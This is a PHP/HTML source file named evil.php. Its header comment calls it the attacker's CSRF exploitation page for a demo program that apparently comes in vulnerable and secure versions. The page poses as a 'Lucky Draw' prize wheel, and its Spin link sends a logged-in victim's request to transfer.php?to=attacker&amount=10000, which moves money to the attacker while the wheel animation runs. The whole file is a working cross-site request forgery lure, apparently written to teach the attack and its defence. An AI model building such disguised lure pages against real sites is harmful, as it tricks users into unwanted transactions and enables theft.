<!--
    evil.php
    The attacker's exploitation script of CSRF attack page for this program 
    This file is the same in both Vuln and Secure directories
-->

<?php
require_once('common.php');
if (!isLoggedIn()) {
    header('Location: /index.html');
}
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <link rel="stylesheet" type="text/css" href="style.css">
        <title>Lucky Draw</title>
    </head>
    <body>
        <div class="container">
            <div class="spinButton">
                <a href="transfer.php?to=attacker&amount=10000">Spin</a>
            </div>
            <div class="wheel">
                <div class="number" style="--i:1;--clr:#db7093;"><span>100</span></div>
                <div class="number" style="--i:2;--clr:#20b2aa;"><span>1000</span></div>
                <div class="number" style="--i:3;--clr:#d63e92;"><span>500</span></div>
                <div class="number" style="--i:4;--clr:#daa520;"><span>200</span></div>
                <div class="number" style="--i:5;--clr:#ff340f;"><span>50000</span></div>
                <div class="number" style="--i:6;--clr:#ff7f50;"><span>10</span></div>
                <div class="number" style="--i:7;--clr:#3cb371;"><span>0</span></div>
                <div class="number" style="--i:8;--clr:#4179e1;"><span>50</span></div>
            </div>
        <script>
            let wheel = document.querySelector('.wheel');
            let spinButton = document.querySelector('.spinButton');
            let value = Math.ceil(Math.random() * 3600);

            spinButton.onclick = function() {
                wheel.style.transform = "rotate(" + value + "deg)";
                value += Math.ceil(Math.random() * 3600);
            }
        </script>
    </body>
</html>
